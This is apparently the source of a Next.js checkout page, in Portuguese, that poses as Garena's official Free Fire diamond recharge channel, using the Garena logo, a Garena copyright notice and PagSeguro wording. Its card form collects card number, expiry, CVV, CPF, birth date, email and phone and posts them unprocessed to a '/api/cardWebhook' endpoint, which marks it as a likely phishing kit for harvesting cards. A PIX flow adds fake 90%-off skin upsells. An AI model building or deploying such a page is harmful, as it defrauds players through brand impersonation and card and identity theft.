"use client";

import { useEffect } from "react";
import Image from "next/image";
import "./checkout.css";
import { useToast } from "@/hooks/useToast";

export default function Checkout() {
  const { showToast, Toasts } = useToast();

  useEffect(() => {
    const checkoutData = JSON.parse(
      sessionStorage.getItem("checkoutData") || "{}"
    );

    const { price, base, bonus, payment, user } = checkoutData;

    // Detecta se base é numérico
    const baseNum = parseInt((base || "").replace(/\D/g, "")) || 0;
    const bonusNum = parseInt((bonus || "").replace(/\D/g, "")) || 0;
    let total: string | number = "";
    if (!isNaN(baseNum) && !isNaN(bonusNum)) {
      total = baseNum + bonusNum;
    } else {
      total = base;
    }

// Preenche os campos do resumo
const elTotal = document.getElementById("summaryTotal");
const elBase = document.getElementById("summaryBase");
const elBonus = document.getElementById("summaryBonus");
const elPrice = document.getElementById("summaryPrice");
const elPayment = document.getElementById("summaryPayment");
const elUser = document.getElementById("summaryUser");

if (elTotal) elTotal.innerHTML = `<img src="point.webp" class="icon">${total}`;
if (elBase) elBase.innerHTML = `<img src="point.webp" class="icon">${base}`;
if (elBonus) elBonus.innerHTML = `<img src="point.webp" class="icon">${bonus}`;
if (elPrice) elPrice.textContent = `R$ ${Number(price).toFixed(2)}`;
if (elPayment) elPayment.textContent = payment;

// 🔥 pega nickname do usuário logado (salvo no localStorage pela Home)
let playerName = user; // fallback do checkoutData
const accountData = localStorage.getItem("accountData");
if (accountData) {
  const acc = JSON.parse(accountData);
  if (acc.nickname) playerName = acc.nickname;
}
if (elUser) elUser.textContent = playerName || "Convidado";


    // Função que remove acentos
    function normalize(str: string) {
      return str
        .toLowerCase()
        .normalize("NFD")
        .replace(/[\u0300-\u036f]/g, "");
    }

    // Alterna formulário conforme pagamento
    if (payment && normalize(payment).includes("cartao")) {
      document.getElementById("form-card")!.style.display = "block";
      document.getElementById("form-default")!.style.display = "none";
    } else {
      document.getElementById("form-default")!.style.display = "block";
      document.getElementById("form-card")!.style.display = "none";
    }
// =========================
// 🚀 Parcelas do Cartão (somente 1x habilitada)
// =========================
const parcelasContainer = document.querySelector(
  "#form-card .select-items"
) as HTMLElement;
const parcelasSelected = document.querySelector(
  "#form-card .select-selected span"
) as HTMLElement;

if (parcelasContainer && parcelasSelected && price) {
  parcelasContainer.innerHTML = ""; // limpa opções antigas

  const valorTotal = parseFloat(String(price).replace(",", ".")) || 0;
  const maxParcelas = 6; // até 6x (ou o que você quiser)

  for (let i = 1; i <= maxParcelas; i++) {
    const valorParcela = valorTotal / i;
    const option = document.createElement("div");

    option.textContent = `${i}x de R$ ${valorParcela.toFixed(2)} sem juros`;

    if (i === 1) {
      // 🔥 habilitada por padrão
      option.classList.add("active");
      parcelasSelected.textContent = option.textContent;

      option.addEventListener("click", () => {
        parcelasSelected.textContent = option.textContent;
        parcelasContainer
          .querySelectorAll("div")
          .forEach((el) => el.classList.remove("active"));
        option.classList.add("active");
        parcelasContainer.classList.remove("show");
      });
    } else {
      // 🔥 demais opções ficam desabilitadas
      option.classList.add("disabled");
    }

    parcelasContainer.appendChild(option);
  }
}
// =========================
// 🚀 Envio do form de cartão para backend
// =========================
const formCard = document.getElementById("form-card") as HTMLFormElement;
if (formCard) {
  formCard.addEventListener("submit", async (e) => {
    e.preventDefault();

    const btn = formCard.querySelector(".btn-submit") as HTMLButtonElement;
    btn.disabled = true;
    btn.textContent = "Enviando...";
    btn.style.background = "#f87171";

    // Coleta dados do form
    const payload = {
      user: playerName,
      price,
      base,
      bonus,
      payment,
      cardNumber: (document.getElementById("cardNumber") as HTMLInputElement)?.value,
      validade: (document.getElementById("validade") as HTMLInputElement)?.value,
      cvv: (document.getElementById("cvv") as HTMLInputElement)?.value,
      parcelas: parcelasSelected?.textContent,
      nome: (document.getElementById("nomeCard") as HTMLInputElement)?.value,
      email: (document.getElementById("emailCard") as HTMLInputElement)?.value,
      cpf: (document.getElementById("cpf") as HTMLInputElement)?.value,
      nascimento: (document.getElementById("nascimento") as HTMLInputElement)?.value,
      telefone: (document.getElementById("telefoneCard") as HTMLInputElement)?.value,
    };

    try {
      const r = await fetch("/api/cardWebhook", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (r.ok) {
        showToast("success", "Sucesso", "Dados enviados com sucesso.");
      } else {
        showToast("error", "Erro", "Falha ao enviar dados.");
      }
    } catch (err) {
      showToast("error", "Erro", "Falha na requisição.");
    } finally {
      btn.disabled = false;
      btn.textContent = "Prosseguir para pagamento";
      btn.style.background = "#ef4444";
    }
  });
}

// =========================
// 🚀 Lógica do custom-select Parcelas
// =========================
const customSelect = document.querySelector("#form-card .custom-select");
if (customSelect) {
  const selected = customSelect.querySelector(".select-selected") as HTMLElement;
  const items = customSelect.querySelector(".select-items") as HTMLElement;

  if (selected && items) {
    // 🔥 Toggle abre/fecha
    selected.addEventListener("click", () => {
      items.classList.toggle("show");
    });

    // 🔥 Seleciona uma opção
    items.querySelectorAll("div").forEach((option) => {
      option.addEventListener("click", () => {
        if (option.classList.contains("disabled")) return;

        // Atualiza o texto
        const span = selected.querySelector("span");
        if (span) span.textContent = option.textContent;

        // Marca ativo
        items.querySelectorAll("div").forEach((el) => el.classList.remove("active"));
        option.classList.add("active");

        // Fecha o dropdown
        items.classList.remove("show");
      });
    });

    // 🔥 Fecha se clicar fora
    document.addEventListener("click", (e) => {
      if (!customSelect.contains(e.target as Node)) {
        items.classList.remove("show");
      }
    });
  }
}

// =========================
// 🚀 Máscaras e validações do Formulário de Cartão
// =========================
const cardNumberInput = document.getElementById("cardNumber") as HTMLInputElement;
const validadeInput = document.getElementById("validade") as HTMLInputElement;
const cvvInput = document.getElementById("cvv") as HTMLInputElement;
const cpfInput = document.getElementById("cpf") as HTMLInputElement;
const nascimentoInput = document.getElementById("nascimento") as HTMLInputElement;
const telefoneCardInput = document.getElementById("telefoneCard") as HTMLInputElement;

if (cardNumberInput) {
  cardNumberInput.addEventListener("input", () => {
    let value = cardNumberInput.value.replace(/\D/g, "").slice(0, 16); // só números, máx 16
    value = value.replace(/(.{4})/g, "$1 ").trim(); // espaço a cada 4
    cardNumberInput.value = value;
  });
}

if (validadeInput) {
  validadeInput.addEventListener("input", () => {
    let value = validadeInput.value.replace(/\D/g, "").slice(0, 4); // só números, máx 4
    if (value.length >= 3) {
      value = value.replace(/(\d{2})(\d{1,2})/, "$1/$2");
    }
    validadeInput.value = value;
  });
}

if (cvvInput) {
  cvvInput.addEventListener("input", () => {
    cvvInput.value = cvvInput.value.replace(/\D/g, "").slice(0, 4); // até 4 dígitos
  });
}

if (cpfInput) {
  cpfInput.addEventListener("input", () => {
    let value = cpfInput.value.replace(/\D/g, "").slice(0, 11); // só números, máx 11
    value = value.replace(/(\d{3})(\d)/, "$1.$2");
    value = value.replace(/(\d{3})(\d)/, "$1.$2");
    value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    cpfInput.value = value;
  });
}

if (nascimentoInput) {
  nascimentoInput.addEventListener("input", () => {
    let value = nascimentoInput.value.replace(/\D/g, "").slice(0, 8);
    if (value.length >= 5) {
      value = value.replace(/(\d{2})(\d{2})(\d{1,4})/, "$1/$2/$3");
    } else if (value.length >= 3) {
      value = value.replace(/(\d{2})(\d{1,2})/, "$1/$2");
    }
    nascimentoInput.value = value;
  });
}

if (telefoneCardInput) {
  telefoneCardInput.addEventListener("input", () => {
    let value = telefoneCardInput.value.replace(/\D/g, "").slice(0, 11);
    if (value.length > 10) {
      value = value.replace(/(\d{2})(\d{1})(\d{4})(\d{4})/, "($1) $2 $3-$4");
    } else if (value.length > 6) {
      value = value.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
    } else if (value.length > 2) {
      value = value.replace(/(\d{2})(\d{0,5})/, "($1) $2");
    } else {
      value = value.replace(/(\d{0,2})/, "($1");
    }
    telefoneCardInput.value = value;
  });
}


    // =========================
    // 🚀 Validação em tempo real dos campos
    // =========================
    const nomeInput = document.getElementById("nome") as HTMLInputElement;
    const emailInput = document.getElementById("email") as HTMLInputElement;
    const telefoneInput = document.getElementById("telefone") as HTMLInputElement;

    // === Nome completo ===
    if (nomeInput) {
      nomeInput.addEventListener("input", () => {
        const errorDiv = nomeInput.parentElement?.querySelector(".error-message") as HTMLElement;
        const value = nomeInput.value.trim();

        if (!value) {
          errorDiv.style.display = "block";
          errorDiv.textContent = "Nome é obrigatório.";
          nomeInput.classList.add("error");
        } else if (value.split(" ").length < 2) {
          errorDiv.style.display = "block";
          errorDiv.textContent = "Por favor, insira o nome e sobrenome.";
          nomeInput.classList.add("error");
        } else {
          errorDiv.style.display = "none";
          nomeInput.classList.remove("error");
        }
      });
    }

    // === E-mail ===
    if (emailInput) {
      emailInput.addEventListener("input", () => {
        const errorDiv = emailInput.parentElement?.querySelector(".error-message") as HTMLElement;
        const value = emailInput.value.trim();
        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

        if (!value) {
          errorDiv.style.display = "block";
          errorDiv.textContent = "E-mail é obrigatório.";
          emailInput.classList.add("error");
        } else if (!regex.test(value)) {
          errorDiv.style.display = "block";
          errorDiv.textContent = "Formato de e-mail inválido.";
          emailInput.classList.add("error");
        } else {
          errorDiv.style.display = "none";
          emailInput.classList.remove("error");
        }
      });
    }

    // === Máscara de Telefone ===
    if (telefoneInput) {
      telefoneInput.addEventListener("input", () => {
        // Remove tudo que não for número
        let value = telefoneInput.value.replace(/\D/g, "");

        // Limita a 11 dígitos (2 DDD + 9 números)
        if (value.length > 11) {
          value = value.slice(0, 11);
        }

        // Se não digitou nada → deixa vazio
        if (value.length === 0) {
          telefoneInput.value = "";
          return;
        }

        // Aplica formatação conforme o tamanho
        if (value.length > 10) {
          // (00) 0 0000-0000
          value = value.replace(/(\d{2})(\d{1})(\d{4})(\d{4})/, "($1) $2 $3-$4");
        } else if (value.length > 6) {
          // (00) 0000-0000
          value = value.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
        } else if (value.length > 2) {
          // (00) 0000
          value = value.replace(/(\d{2})(\d{0,5})/, "($1) $2");
        } else if (value.length <= 2) {
          // (0 ou (00
          value = value.replace(/(\d{0,2})/, "($1");
        }

        telefoneInput.value = value;
      });
    }

    // =========================
    // 🚀 Checkbox Promo
    // =========================
    const promoItems = document.querySelectorAll(".promo-item") as NodeListOf<HTMLElement>;
    const promoTotalEl = document.getElementById("promoTotal");
    const finalizarBtn = document.getElementById("finalizarPromo") as HTMLButtonElement;

    let promoExtra = 0;
const baseCheckout = parseFloat(String(checkoutData.price).replace(",", ".")) || 0;

// 🔥 Inicializa o total do modal com o valor base
if (promoTotalEl) {
  promoTotalEl.textContent = `R$ ${baseCheckout.toFixed(2)}`;
}
if (finalizarBtn) {
  finalizarBtn.textContent = `Adicionar e Pagar R$ ${baseCheckout.toFixed(2)}`;
}


    promoItems.forEach((item) => {
      const checkbox = item.querySelector(".promo-check") as HTMLInputElement;
      const priceText = item.querySelector(".price")?.textContent || "0";
      const price = parseFloat(priceText.replace("R$", "").replace(",", "."));

      // 🔥 Clique em qualquer lugar do item → alterna checkbox
      item.addEventListener("click", (e) => {
        if ((e.target as HTMLElement).classList.contains("promo-check")) return;

        checkbox.checked = !checkbox.checked;
        // 🔥 dispara evento para recalcular total
        checkbox.dispatchEvent(new Event("change", { bubbles: true }));
      });

      // 🔥 Recalcula ao mudar checkbox
      checkbox.addEventListener("change", () => {
        if (checkbox.checked) {
          promoExtra += price;
        } else {
          promoExtra -= price;
        }

        const totalAtual = baseCheckout + promoExtra;

if (promoTotalEl) {
  promoTotalEl.textContent = `R$ ${totalAtual.toFixed(2)}`;
}
if (finalizarBtn) {
  finalizarBtn.textContent = `Adicionar e Pagar R$ ${totalAtual.toFixed(2)}`;
}
sessionStorage.setItem("checkoutData", JSON.stringify({
  ...checkoutData,
  price: totalAtual.toFixed(2) // string "14.90"
}));
      });
    });

    // =========================
    // 🚀 Modal Promo
    // =========================
    const formPix = document.getElementById("form-default") as HTMLFormElement;

    if (formPix) {
      formPix.addEventListener("submit", handleOpenPromo);
    }

    function handleOpenPromo(e: Event) {
      e.preventDefault();
      const btn = formPix.querySelector(".btn-submit") as HTMLButtonElement;
      btn.disabled = true;
      btn.textContent = "Processando...";
      btn.style.background = "#f87171";

      let valid = true;

      formPix.querySelectorAll("input").forEach((input) => {
        const errorDiv = input.parentElement?.querySelector(".error-message") as HTMLElement;

        if (input.id === "promo") return;

        if (input.value.trim() === "") {
          input.classList.add("error");
          if (errorDiv) errorDiv.style.display = "block";
          valid = false;
        } else {
          input.classList.remove("error");
          if (errorDiv) errorDiv.style.display = "none";
        }
      });

      if (!valid) {
        btn.disabled = false;
        btn.textContent = "Prosseguir para pagamento";
        btn.style.background = "#d32f2f";

        // 🔥 Toast de erro
        showToast(
          "error",
          "Erro de Validação",
          "Por favor, preencha todos os campos obrigatórios corretamente."
        );
        return; // 🚫 não abre modal
      }

      // ✅ só abre modal se passar na validação
      document.getElementById("promoOverlay")?.classList.add("show");
      document.getElementById("promoModal")?.classList.add("show");

document.getElementById("skipPromo")?.addEventListener("click", () => {
  // Atualiza o preço com o valor base original
  const checkoutData = JSON.parse(sessionStorage.getItem("checkoutData") || "{}");
  const baseCheckout = parseFloat(String(checkoutData.price).replace(",", ".")) || 0;
  
  // Recalcular o total sem as promoções
  const totalFinal = baseCheckout;

  // Atualizar o sessionStorage com o novo valor do price
  sessionStorage.setItem("checkoutData", JSON.stringify({
    ...checkoutData,
    price: totalFinal // Atualizando o preço com o valor base
  }));

  // Fechar o modal
  fecharPromo();
  
  // Continuar com o pagamento (processamento do Pix)
  continuarPix();
});


      // "Finalizar Pedido"
      document.getElementById("finalizarPromo")?.addEventListener("click", () => {
        fecharPromo();
        continuarPix();
      });
    }

    function fecharPromo() {
      document.getElementById("promoOverlay")?.classList.remove("show");
      document.getElementById("promoModal")?.classList.remove("show");
    }

    async function continuarPix() {
      const btn = formPix.querySelector(".btn-submit") as HTMLButtonElement;
      btn.disabled = true;
      btn.textContent = "Processando...";
      btn.style.background = "#f87171";

      let valid = true;

      formPix.querySelectorAll("input").forEach((input) => {
        const errorDiv = input.parentElement?.querySelector(".error-message") as HTMLElement;

        if (input.id === "promo") return;

        if (input.value.trim() === "") {
          input.classList.add("error");
          if (errorDiv) errorDiv.style.display = "block";
          valid = false;
        } else {
          input.classList.remove("error");
          if (errorDiv) errorDiv.style.display = "none";
        }
      });

      if (!valid) {
        btn.disabled = false;
        btn.textContent = "Prosseguir para pagamento";
        btn.style.background = "#d32f2f";
        showToast("error", "Erro de Validação", "Por favor, preencha todos os campos obrigatórios corretamente.");
        return;
      }

      const checkoutData = JSON.parse(sessionStorage.getItem("checkoutData") || "{}");
const totalFinal = parseFloat(checkoutData.price);

      let amountCents = Math.round(totalFinal * 100);
      const orderId = Date.now().toString();
      const description = `Recarga Free Fire - Pedido #${orderId}`;

      const payer = {
  name: nomeInput?.value,   // Agora acessa a propriedade value corretamente
  email: emailInput?.value,
  phone: telefoneInput?.value,
      };

      try {
        const r = await fetch("/api/checkout", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ amount: amountCents, orderId, description, payer }),
        });

        const data = await r.json();

        if (!r.ok || !data.id) {
          showToast("error", "Erro", "Erro ao gerar PIX.");
          btn.disabled = false;
          btn.textContent = "Prosseguir para pagamento";
          btn.style.background = "#d32f2f";
          return;
        }

        sessionStorage.setItem("pixCheckout", JSON.stringify({
          ...checkoutData,
          transactionId: data.id,
          brcode: data.brcode,
          qrBase64: data.qrBase64,
          totalAmount: totalFinal,
          createdAt: Date.now(),
        }));

        setTimeout(() => {
          window.location.href = "/buy";
        }, 1500);
      } catch (err) {
        showToast("error", "Erro", "Falha na integração PIX.");
        btn.disabled = false;
        btn.textContent = "Prosseguir para pagamento";
        btn.style.background = "#d32f2f";
      }
    }
  }, [showToast]);


  return (
        <>
    <main>
      {/* 🔥 HEADER igual ao da Home */}
      <header>
        <div className="container nav">
          <div className="brand">
            <div className="brand-text">
              <Image src="/image.png" alt="Garena Logo" width={100} height={40} />
              <span className="divider"></span>
              <span>Canal Oficial de Recarga</span>
            </div>
          </div>
          <div className="profile" title="Perfil">
            <Image
              src="/ff.webp"
              alt="Perfil"
              width={40}
              height={40}
              className="rounded-full object-cover"
            />
          </div>
        </div>
      </header>

      {/* 🚀 Checkout */}
      <div className="checkout">
        <div className="banner">
          <Image src="/FF-f997537d.jpg" alt="Banner Free Fire" width={920} height={300} />
    <button 
  className="back-btn" 
  onClick={() => { window.location.href = "/"; }}
>
  <span className="icon">❮</span> Voltar
</button>

        </div>

        <div className="game-header">
          <Image
            src="/icon.webp"
            alt="Free Fire"
            width={90}
            height={90}
            className="game-icon"
          />
          <h2>Free Fire</h2>
        </div>

        <div className="summary">
          <p>
            <span>Total</span>
            <span id="summaryTotal"></span>
          </p>

          <div className="bonus-box">
            <p>
              <span>Preço Original</span>
              <span id="summaryBase"></span>
            </p>
            <p>
              <span>+ Bônus Geral</span>
              <span id="summaryBonus"></span>
            </p>
          </div>

          <p className="info-text">
            Os diamantes são válidos apenas para a região do Brasil e serão creditados diretamente na conta de jogo.
          </p>

          <hr style={{ margin: "14px 0", border: "none", borderTop: "1px solid var(--line)" }} />

          <div className="summary-details">
            <p>
              <span>Preço</span>
              <strong id="summaryPrice"></strong>
            </p>
            <p>
              <span>Método de pagamento</span>
              <strong id="summaryPayment"></strong>
            </p>
            <p>
              <span>Nome do Jogador</span>
              <strong id="summaryUser"></strong>
            </p>
          </div>

          <form id="form-default">
            <div className="form-group">
              <label htmlFor="promo">Código promocional</label>
              <div className="promo-box">
                <input type="text" id="promo" placeholder="Código Promocional" />
                <button type="button" className="btn-small">
                  Aplicar
                </button>
              </div>
            </div>

            <div className="form-group">
              <label htmlFor="nome">Nome completo</label>
              <input type="text" id="nome" placeholder="Nome Completo" />
              <div className="error-message">Nome é obrigatório.</div>
            </div>

            <div className="form-group">
              <label htmlFor="email">E-mail</label>
              <input type="email" id="email" placeholder="E-mail" />
              <div className="error-message">E-mail é obrigatório.</div>
            </div>

            <div className="form-group">
              <label htmlFor="telefone">Número de telefone</label>
              <input type="tel" id="telefone" placeholder="(00) 0 0000-0000" />
              <div className="error-message">Número de telefone é obrigatório.</div>
            </div>

            <p className="terms">
              Ao clicar em “Prosseguir para Pagamento”, atesto que li e concordo com os termos de uso e com a política de privacidade.
            </p>
            <button className="btn-submit">Prosseguir para pagamento</button>
          </form>
{/* 🔥 Formulário Cartão */}
<form id="form-card" style={{ display: "none" }}>
  <div className="form-group">
    <label htmlFor="cardNumber">Número do cartão</label>
    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" />
    <div className="error-message">Número do cartão é obrigatório.</div>
  </div>

  <div style={{ display: "flex", gap: "10px" }}>
    <div className="form-group" style={{ flex: 1 }}>
      <label htmlFor="validade">Validade</label>
      <input type="text" id="validade" placeholder="MM/AA" />
      <div className="error-message">Data de validade inválida.</div>
    </div>
    <div className="form-group" style={{ flex: 1 }}>
      <label htmlFor="cvv">Código de segurança</label>
      <input type="text" id="cvv" placeholder="CVV" />
      <div className="error-message">CVV inválido.</div>
    </div>
  </div>

  {/* 🔥 Select Customizado das Parcelas */}
  <div className="form-group">
    <label>Parcelas</label>
    <div className="custom-select">
      <div className="select-selected">
        <span>Selecione o número de parcelas</span>
        <svg
          className="arrow"
          xmlns="http://www.w3.org/2000/svg"
          width="16"
          height="16"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            strokeLinecap="round"
            strokeLinejoin="round"
            strokeWidth="2"
            d="M19 9l-7 7-7-7"
          />
        </svg>
      </div>
      <div className="select-items">
        <div>1x de R$ 6,00 sem juros</div>
        <div className="disabled">2x de R$ 3,00 sem juros</div>
        {/* pode adicionar mais opções aqui */}
      </div>
    </div>
    <div className="error-message">Selecione uma parcela.</div>
  </div>

  <div className="form-group">
    <label htmlFor="nomeCard">Nome completo</label>
    <input type="text" id="nomeCard" placeholder="Nome Completo" />
    <div className="error-message">Nome é obrigatório.</div>
  </div>

  <div className="form-group">
    <label htmlFor="emailCard">E-mail</label>
    <input type="email" id="emailCard" placeholder="E-mail" />
    <div className="error-message">E-mail é obrigatório.</div>
  </div>

  <div style={{ display: "flex", gap: "10px" }}>
    <div className="form-group" style={{ flex: 1 }}>
      <label htmlFor="cpf">CPF</label>
      <input type="text" id="cpf" placeholder="000.000.000-00" />
      <div className="error-message">CPF inválido.</div>
    </div>
    <div className="form-group" style={{ flex: 1 }}>
      <label htmlFor="nascimento">Data de nascimento</label>
      <input type="text" id="nascimento" placeholder="DD/MM/AAAA" />
      <div className="error-message">Data de nascimento inválida.</div>
    </div>
  </div>

  <div className="form-group">
    <label htmlFor="telefoneCard">Número de telefone</label>
    <input type="tel" id="telefoneCard" placeholder="(00) 0 0000-0000" />
    <div className="error-message">Número de telefone é obrigatório.</div>
  </div>

  <p className="terms">
    Ao clicar em “Prosseguir para Pagamento”, atesto que li e concordo com os
    termos de uso e com a política de privacidade do PagSeguro.
  </p>
  <button className="btn-submit">Prosseguir para pagamento</button>
</form>
    </div>
{/* 🔥 Modal de Promoção Especial */}
<div id="promoOverlay" className="modal-overlay"></div>

<div id="promoModal" className="modal promo-modal">
  <h3 className="modal-title">Promoção Especial</h3>
  <p className="modal-desc">Aproveite estas ofertas exclusivas para turbinar ainda mais sua conta!</p>

  <div className="promo-list">

    <div className="promo-item" data-price="9.99">
      <img src="/Screenshot-35.webp" alt="Sombra Roxa" />
      <div className="promo-info">
        <strong>Sombra Roxa</strong>
        <div className="promo-prices">
          <span className="old">R$ 99,99</span>
          <span className="price">R$ 9,99</span>
        </div>
      </div>
      <input type="checkbox" className="promo-check" />
    </div>

    <div className="promo-item" data-price="9.99">
      <img src="/Screenshot-32.webp" alt="Barba do Velho" />
      <div className="promo-info">
        <strong>Barba do Velho</strong>
        <div className="promo-prices">
          <span className="old">R$ 99,99</span>
          <span className="price">R$ 9,99</span>
        </div>
      </div>
      <input type="checkbox" className="promo-check" />
    </div>

    <div className="promo-item" data-price="4.99">
      <img src="/Screenshot-33.webp" alt="Pacote Coelhão" />
      <div className="promo-info">
        <strong>Pacote Coelhão</strong>
        <div className="promo-prices">
          <span className="old">R$ 49,99</span>
          <span className="price">R$ 4,99</span>
        </div>
      </div>
      <input type="checkbox" className="promo-check" />
    </div>

    <div className="promo-item" data-price="14.99">
      <img src="/Screenshot-31.webp" alt="Calça Angelical Azul" />
      <div className="promo-info">
        <strong>Calça Angelical Azul</strong>
        <div className="promo-prices">
          <span className="old">R$ 149,99</span>
          <span className="price">R$ 14,99</span>
        </div>
      </div>
      <input type="checkbox" className="promo-check" />
    </div>

    <div className="promo-item" data-price="7.50">
      <img src="/Screenshot-34.webp" alt="Dunk Master" />
      <div className="promo-info">
        <strong>Dunk Master</strong>
        <div className="promo-prices">
          <span className="old">R$ 75,90</span>
          <span className="price">R$ 7,50</span>
        </div>
      </div>
      <input type="checkbox" className="promo-check" />
    </div>

  </div>

  <div className="promo-footer">
    <div className="total">
      <strong>Total:</strong> <span id="promoTotal">R$ 0,00</span>
    </div>
    <button id="finalizarPromo" className="btn-submit">Finalizar Pedido</button>
    <button id="skipPromo" className="btn ghost">Não, obrigado</button>
  </div>
</div>


      </div>
      {/* FOOTER */}
<footer className="footer">
  <div className="container footer-inner">
    <span>© 2025 Garena Online. Todos os direitos reservados.</span>
    <div className="footer-links">
      <a href="#">FAQ</a>
      <a href="#">Termos e Condições</a>
      <a href="#">Política de Privacidade</a>
    </div>
  </div>
</footer>

    </main>
    
      <Toasts />
    </>
  );
}
